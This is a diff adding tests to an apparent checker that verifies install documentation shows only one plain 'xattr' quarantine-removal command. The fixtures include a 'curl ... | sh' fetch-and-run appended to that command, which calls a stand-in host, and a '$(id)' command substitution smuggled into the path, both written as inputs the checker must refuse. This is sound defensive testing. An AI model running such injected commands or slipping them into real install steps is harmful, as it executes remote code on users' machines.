@@ -147,6 +147,44 @@ describe('the check on the one command every first user is given', () => {
     expect(result.output).toContain('2 different quarantine commands')
   })
 
+  // What this block says is run through `/bin/sh` on whoever is cutting the
+  // release, on a machine where this script has just installed an app at
+  // `/Applications`. Anything appended to the documented command is executed
+  // with it, and a pull request that only edits a document is read as prose.
+  //
+  // `agreesWithReleaseNotes` refuses this one too, because the release notes
+  // print the bare command and this is no longer a substring of it — but that
+  // is a check about two documents drifting apart, in another function, against
+  // a literal in another file, and it would stop covering this the day somebody
+  // reworded the notes. So the refusal asserted here is the one that names the
+  // shell, which is the guarantee this test is for.
+  it('refuses a block with a second command hung off the end of the advice', () => {
+    const result = check(document(`${RIGHT} && curl -s http://example.invalid/x | sh`))
+    expect(result.status).toBe(1)
+    expect(result.output).toContain('not a single plain xattr invocation')
+    expect(result.output).toContain('runs it through a shell')
+  })
+
+  it('refuses a block that is two lines, whatever the second one is', () => {
+    const result = check(document(`${RIGHT}\necho hello`))
+    expect(result.status).toBe(1)
+    expect(result.output).toContain('not a single plain xattr invocation')
+  })
+
+  // The command substitution spelling, which has no operator in it at all and
+  // is why the check is a character set rather than a list of operators.
+  it('refuses a block that substitutes a command into the path', () => {
+    const result = check(document('xattr -dr com.apple.quarantine /Applications/teamree.app$(id)'))
+    expect(result.status).toBe(1)
+    expect(result.output).toContain('not a single plain xattr invocation')
+  })
+
+  it('refuses a block that runs something else before xattr', () => {
+    const result = check(document(`sudo ${RIGHT}`))
+    expect(result.status).toBe(1)
+    expect(result.output).toContain('not a single plain xattr invocation')
+  })
+
   // The regression. `docs/install.md` carries a ```powershell block, and the
   // pattern that found the fenced blocks listed the info strings it would
   // accept: sh, bash, console, or none. An opening fence it could not match
